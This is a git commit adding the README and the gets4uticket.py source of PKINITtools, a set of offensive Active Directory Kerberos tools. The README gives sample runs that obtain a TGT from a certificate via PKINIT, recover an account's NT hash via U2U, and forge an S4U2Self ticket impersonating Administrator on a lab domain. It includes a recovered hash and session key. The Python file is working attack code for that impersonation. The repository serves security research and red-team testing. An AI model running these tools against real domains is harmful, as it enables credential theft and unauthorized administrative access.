63cf285e6049032c9acfbf0323e9d4b2ca1d3905
Dirkjan Mollema <dirkjan.mollema@fox-it.com>
2021-07-28 10:35:06 +0200

    initial commit

---
+++ README.md
@@ -0,0 +1,113 @@
+# PKINIT tools
+
+This repository contains some utilities for playing with PKINIT and certificates.  
+The tools are built on [minikerberos](https://github.com/skelsec/minikerberos/tree/master/minikerberos) and [impacket](https://github.com/SecureAuthCorp/impacket).
+
+## Installation
+These tools are only compatible with Python 3.5+. Clone the repository from GitHub, install the dependencies and you should be good to go:
+
+```bash
+git clone https://github.com/dirkjanm/PKINITtools
+pip3 install impacket minikerberos
+```
+
+Using a virtualenv for this is recommended.
+
+## Tools
+
+### gettgtpkinit.py
+Request a TGT using a PFX file or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool. Usage example:
+
+```
+(PKINITtools) user@localhost:~/PKINITtools$ python gettgtpkinit.py -h
+usage: gettgtpkinit.py [-h] [-cert-pfx PFX file] [-pfx-pass PFX file password] [-cert-pem Certificate in PEM format]
+                       [-key-pem Private key file in PEM format] [-dc-ip DC_IP] [-v]
+                       domain/username ccache
+
+Requests a TGT using Kerberos PKINIT and either a PEM or PFX based certificate+key
+
+positional arguments:
+  domain/username       Domain and username in the cert
+  ccache                ccache file to store the TGT in
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -cert-pfx PFX file
+  -pfx-pass PFX file password
+  -cert-pem Certificate in PEM format
+  -key-pem Private key file in PEM format
+  -dc-ip DC_IP          DC IP or hostname to use as KDC
+  -v, --verbose
+
+(PKINITtools) user@localhost:~/PKINITtools$ python gettgtpkinit.py testsegment.local/s2019dc\$ -cert-pfx ~/impacket-py3/cert.pfx -pfx-pass hoi s2019dc.ccache
+2021-07-27 21:25:24,299 minikerberos INFO     Loading certificate and key from file
+2021-07-27 21:25:24,316 minikerberos INFO     Requesting TGT
+2021-07-27 21:25:24,333 minikerberos INFO     AS-REP encryption key (you might need this later):
+2021-07-27 21:25:24,333 minikerberos INFO     5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
+2021-07-27 21:25:24,336 minikerberos INFO     Saved TGT to file
+```
+
+### getnthash.py
+Use Kerberos U2U to submit a TGS request for yourself. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that was used for your specific TGT. It's magic really. This tool requires a TGT resulting from PKINIT to be in your `KRB5CCNAME` env variable. Usage:
+
+```
+(PKINITtools) user@localhost:~/PKINITtools$ python getnthash.py -h
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+usage: getnthash.py [-h] -key KEY [-dc-ip ip address] [-debug] identity
+
+positional arguments:
+  identity           domain/username
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -key KEY           AS REP key from gettgtpkinit.py
+  -dc-ip ip address  IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
+  -debug             Turn DEBUG output ON
+
+(PKINITtools) user@localhost:~/PKINITtools$ export KRB5CCNAME=s2019dc.ccache
+(PKINITtools) user@localhost:~/PKINITtools$ python getnthash.py testsegment.local/s2019dc\$ -key 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+fa6b130d73311d1be5495f589f9f4571
+```
+
+### gets4uticket.py
+Uses Kerberos S4U2Self to request a service ticket that is valid on the host for which you've obtained a certificate. This ticket can then be used to interact with the original host. This only requires a TGT for the machine account of this host. This TGT should be in a ccache file that you specify in the `kerberos_connection_url`. The only accepted `kerberos_connection_url` for this example is one containing a ccache file, so for example `kerberos+ccache://domain.local\\victimhostname\$:victimhostname.ccache@kdchostname.domain.local`. The SPN should be a service name on the host you are impersonating, you can't use this for delegation attacks (since it does not implement S4U2Proxy, there are plenty of tools already for that). Usage:
+
+```
+(PKINITtools) user@localhost:~/PKINITtools$ python gets4uticket.py -h
+usage: gets4uticket.py [-h] [-v] kerberos_connection_url spn targetuser ccache
+
+Gets an S4U2self ticket impersonating given user
+
+positional arguments:
+  kerberos_connection_url
+                        the kerberos target string in the following format kerberos+ccache://domain\user:file.ccache@<domaincontroller-ip>
+  spn                   the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a
+                        TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER'S HOSTNAME MUST BE USED, NOT IP!!!
+  targetuser
+  ccache                ccache file to store the TGT ticket in
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -v, --verbose
+
+(PKINITtools) user@localhost:~/PKINITtools$ python gets4uticket.py kerberos+ccache://testsegment.local\\s2019dc\$:s2019dc.ccache@s2016dc.testsegment.local cifs/s2019dc.testsegment.local@testsegment.local Administrator@testsegment.local out.ccache -v
+2021-07-28 10:09:13,687 minikerberos INFO     Trying to get SPN with Administrator@testsegment.local for cifs/s2019dc.testsegment.local@testsegment.local
+2021-07-28 10:09:13,695 minikerberos INFO     Success!
+2021-07-28 10:09:13,696 minikerberos INFO     Done!
+```
+
+
+## License
+MIT
+
+## Credits
+* [SkelSec](https://twitter.com/skelsec) for [minikerberos](https://github.com/skelsec/minikerberos/tree/master/minikerberos)
+* Alberto Solino and the team at SecureAuthCorp for [impacket](https://github.com/SecureAuthCorp/impacket)
+* [Mor Rubin](https://twitter.com/rubin_mor) for their first PKINIT implementation in python as part of [AzureADJoinedMachinePTC](https://github.com/morRubin/AzureADJoinedMachinePTC)
+* [Benjamin Delpy](https://twitter.com/gentilkiwi) for implementing these things in [kekeo](https://github.com/gentilkiwi/kekeo)
---
+++ gets4uticket.py
@@ -0,0 +1,204 @@
+#!/usr/bin/env python3
+#
+# Based on examples from minikerberos by skelsec
+#
+# Author:
+#  Tamas Jos (@skelsec)
+#  Dirk-jan Mollema (@_dirkjan)
+#
+import os
+import logging
+import asyncio
+import datetime
+import pprint
+import secrets
+
+from minikerberos import logger
+from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
+from minikerberos.common.creds import KerberosCredential
+from minikerberos.client import KerbrosClient
+from minikerberos.common.spn import KerberosSPN
+from minikerberos.protocol.asn1_structs import ETYPE_INFO, ETYPE_INFO2, \
+    PADATA_TYPE, PA_PAC_REQUEST, PA_ENC_TS_ENC, EncryptedData, krb5_pvno, KDC_REQ_BODY, \
+    AS_REQ, KDCOptions, EncASRepPart, EncTGSRepPart, PrincipalName, Realm, \
+    Checksum, APOptions, Authenticator, Ticket, AP_REQ, TGS_REQ, CKSUMTYPE, \
+    PA_FOR_USER_ENC, PA_PAC_OPTIONS, PA_PAC_OPTIONSTypes
+from minikerberos.protocol.errors import KerberosError
+from minikerberos.protocol.encryption import Key, _enctype_table, _HMACMD5
+from minikerberos.protocol.constants import PaDataType, NAME_TYPE, MESSAGE_TYPE
+
+class KerberosClient(KerbrosClient):
+
+    @staticmethod
+    def from_tgt(target, tgt, key):
+        """
+        Sets up the kerberos object from tgt and the session key.
+        Use this function when pulling the TGT from ccache file.
+        """
+        kc = KerberosClient(None, target)
+        kc.kerberos_TGT = tgt
+
+        kc.kerberos_cipher_type = key['keytype']
+        kc.kerberos_session_key = Key(kc.kerberos_cipher_type, key['keyvalue'])
+        kc.kerberos_cipher = _enctype_table[kc.kerberos_cipher_type]
+        return kc
+
+    def S4U2self(self, user_to_impersonate, spn_user, supp_enc_methods = None):
+        """
+        user_to_impersonate : KerberosTarget class
+        """
+
+        if not self.kerberos_TGT:
+            logger.debug('[S4U2self] TGT is not available! Fetching TGT...')
+            self.get_TGT()
+
+        supp_enc = [self.kerberos_cipher_type,]
+        auth_package_name = 'Kerberos'
+        now = datetime.datetime.now(datetime.timezone.utc)
+
+
+        ###### Calculating authenticator data
+        authenticator_data = {}
+        authenticator_data['authenticator-vno'] = krb5_pvno
+        authenticator_data['crealm'] = Realm(self.kerberos_TGT['crealm'])
+        authenticator_data['cname'] = self.kerberos_TGT['cname']
+        authenticator_data['cusec'] = now.microsecond
+        authenticator_data['ctime'] = now.replace(microsecond=0)
+
+        authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
+
+        ap_req = {}
+        ap_req['pvno'] = krb5_pvno
+        ap_req['msg-type'] = MESSAGE_TYPE.KRB_AP_REQ.value
+        ap_req['ap-options'] = APOptions(set())
+        ap_req['ticket'] = Ticket(self.kerberos_TGT['ticket'])
+        ap_req['authenticator'] = EncryptedData({'etype': self.kerberos_cipher_type, 'cipher': authenticator_data_enc})
+
+        pa_data_auth = {}
+        pa_data_auth['padata-type'] = PaDataType.TGS_REQ.value
+        pa_data_auth['padata-value'] = AP_REQ(ap_req).dump()
+
+        ###### Calculating checksum data
+
+        S4UByteArray = NAME_TYPE.PRINCIPAL.value.to_bytes(4, 'little', signed = False)
+        S4UByteArray += user_to_impersonate.username.encode()
+        S4UByteArray += user_to_impersonate.domain.encode()
+        S4UByteArray += auth_package_name.encode()
+        logger.debug('[S4U2self] S4UByteArray: %s' % S4UByteArray.hex())
+        logger.debug('[S4U2self] S4UByteArray: %s' % S4UByteArray)
+
+        chksum_data = _HMACMD5.checksum(self.kerberos_session_key, 17, S4UByteArray)
+        logger.debug('[S4U2self] chksum_data: %s' % chksum_data.hex())
+
+
+        chksum = {}
+        chksum['cksumtype'] = int(CKSUMTYPE('HMAC_MD5'))
+        chksum['checksum'] = chksum_data
+
+
+        ###### Filling out PA-FOR-USER data for impersonation
+        pa_for_user_enc = {}
+        pa_for_user_enc['userName'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': user_to_impersonate.get_principalname()})
+        pa_for_user_enc['userRealm'] = user_to_impersonate.domain
+        pa_for_user_enc['cksum'] = Checksum(chksum)
+        pa_for_user_enc['auth-package'] = auth_package_name
+
+        pa_for_user = {}
+        pa_for_user['padata-type'] = int(PADATA_TYPE('PA-FOR-USER'))
+        pa_for_user['padata-value'] = PA_FOR_USER_ENC(pa_for_user_enc).dump()
+
+        ###### Constructing body
+
+        krb_tgs_body = {}
+        krb_tgs_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','canonicalize']))
+        krb_tgs_body['sname'] = PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': spn_user.get_principalname()})
+        krb_tgs_body['realm'] = self.kerberos_TGT['crealm'].upper()
+        krb_tgs_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
+        krb_tgs_body['nonce'] = secrets.randbits(31)
+        krb_tgs_body['etype'] = supp_enc #selecting according to server's preferences
+
+
+        krb_tgs_req = {}
+        krb_tgs_req['pvno'] = krb5_pvno
+        krb_tgs_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
+        krb_tgs_req['padata'] = [pa_data_auth, pa_for_user]
+        krb_tgs_req['req-body'] = KDC_REQ_BODY(krb_tgs_body)
+
+        req = TGS_REQ(krb_tgs_req)
+
+        logger.debug('[S4U2self] Sending request to server')
+        try:
+            reply = self.ksoc.sendrecv(req.dump())
+        except KerberosError as e:
+            if e.errorcode.value == 16:
+                logger.error('[S4U2self] Failed to get S4U2self! Error code (16) indicates that delegation is not enabled for this account! Full error: %s' % e)
+
+            raise e
+
+        logger.debug('[S4U2self] Got reply, decrypting...')
+        tgs = reply.native
+
+        encTGSRepPart = EncTGSRepPart.load(self.kerberos_cipher.decrypt(self.kerberos_session_key, 8, tgs['enc-part']['cipher'])).native
+        key = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
+
+        self.ccache.add_tgs(tgs, encTGSRepPart)
+        logger.debug('[S4U2self] Got valid TGS reply')
+        self.kerberos_TGS = tgs
+        return tgs, encTGSRepPart, key
+
+async def amain(args):
+    # This only works with ccache because I had to work around everything breaking
+    # when using a ccache
+    cu = KerberosClientURL.from_url(args.kerberos_connection_url)
+    ccred = cu.get_creds()
+    target = cu.get_target()
+    ccred = KerberosCredential.from_ccache_file(cu.secret)
+    service_spn = KerberosSPN.from_target_string(args.spn)
+    target_user = KerberosSPN.from_user_email(args.targetuser)
+
+    if not ccred.ccache:
+        logger.info('You need to specify a ccache in the Kerberos URL')
+        return
+    else:
+        logger.debug('Getting TGS via TGT from CCACHE')
+        for tgt, key in ccred.ccache.get_all_tgt():
+            try:
+                logger.info('Trying to get SPN with %s for %s' % (target_user, service_spn))
+                client = KerberosClient.from_tgt(target, tgt, key)
+
+                tgs, encTGSRepPart, key = client.S4U2self(target_user, service_spn)
+                client.ccache.add_tgs(tgs, encTGSRepPart)
+                logger.info('Success!')
+            except SyntaxError as e:
+                logger.debug('This ticket is not usable it seems Reason: %s' % e)
+                continue
+            else:
+                break
+
+    client.ccache.to_file(args.ccache)
+    logger.info('Done!')
+
+
+def main():
+    import argparse
+
+    parser = argparse.ArgumentParser(description='Gets an S4U2self ticket impersonating given user', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
+    parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+ccache://domain\\user:file.ccache@<domaincontroller-ip>')
+    parser.add_argument('spn', help='the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER\'S HOSTNAME MUST BE USED, NOT IP!!!')
+    parser.add_argument('targetuser', help='')
+    parser.add_argument('ccache', help='ccache file to store the TGT ticket in')
+    parser.add_argument('-v', '--verbose', action='count', default=0)
+
+    args = parser.parse_args()
+    if args.verbose == 0:
+        logger.setLevel(logging.WARNING)
+    elif args.verbose == 1:
+        logger.setLevel(logging.INFO)
+    else:
+        logger.setLevel(1)
+
+    asyncio.run(amain(args))
+
+
+if __name__ == '__main__':
+    main()
